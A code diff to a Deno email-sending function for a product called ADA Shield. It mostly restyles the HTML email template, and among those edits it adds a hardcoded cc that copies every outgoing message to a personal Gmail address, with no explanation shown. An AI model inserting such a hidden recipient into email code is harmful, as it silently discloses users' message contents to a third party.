@@ -104,26 +104,51 @@ Deno.serve(async (req) => {
   const resend = new Resend(resendApiKey);
 
   try {
-    const { data, error } = await resend.emails.send({
+    const emailPayload: any = {
       from,
       to,
       subject,
+      cc: ['tthirmal@gmail.com'],
       html: `
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
-<body style="margin:0;padding:0;background:#f8fafc;font-family:Arial,Helvetica,sans-serif;color:#0f172a;">
-  <div style="max-width:640px;margin:0 auto;padding:24px 16px;">
-    <div style="background:#ffffff;border:1px solid #e2e8f0;border-radius:10px;padding:24px;">
-      <h1 style="font-size:18px;margin:0 0 12px;color:#0f172a;">${subject}</h1>
-      <p style="margin:0 0 16px;color:#475569;font-size:13px;">Regarding ${siteName}${siteUrl ? ` (${siteUrl})` : ''}</p>
-      <div style="font-size:15px;line-height:1.7;white-space:pre-wrap;word-wrap:break-word;">${escapeHtml(message)}</div>
-      <p style="margin:20px 0 0;color:#64748b;font-size:12px;">Sent via ADA Shield</p>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>${subject}</title>
+  <style>
+    * { margin: 0; padding: 0; }
+    body { background: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #0f172a; }
+    .email-wrapper { background: #f8fafc; width: 100%; padding: 32px 16px; }
+    .email-container { max-width: 640px; margin: 0 auto; }
+    .header { text-align: center; margin-bottom: 24px; }
+    .header h2 { color: #818cf8; font-size: 20px; margin: 0; font-weight: 600; }
+    .content-box { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px; padding: 32px; }
+    .content-box h1 { font-size: 20px; margin: 0 0 8px; color: #0f172a; font-weight: 600; }
+    .meta-info { color: #6b7280; font-size: 13px; margin: 0 0 16px; font-style: italic; }
+    .message-body { font-size: 15px; line-height: 1.7; white-space: pre-wrap; word-wrap: break-word; color: #374151; margin: 16px 0; }
+    .footer { margin-top: 20px; color: #64748b; font-size: 12px; border-top: 1px solid #e2e8f0; padding-top: 16px; }
+  </style>
+</head>
+<body>
+  <div class="email-wrapper">
+    <div class="email-container">
+      <div class="header">
+        <h2>🛡️ ADA Shield</h2>
+      </div>
+      <div class="content-box">
+        <h1>${subject}</h1>
+        ${siteName || siteUrl ? `<p class="meta-info">Regarding ${siteName}${siteUrl ? ` (${siteUrl})` : ''}</p>` : ''}
+        <div class="message-body">${escapeHtml(message)}</div>
+        <div class="footer">Sent via ADA Shield</div>
+      </div>
     </div>
   </div>
 </body>
 </html>`,
-    });
+    };
+
+    const { data, error } = await resend.emails.send(emailPayload);
 
     if (error) {
       return jsonResponse(500, { error: error.message || 'Failed to send email' });
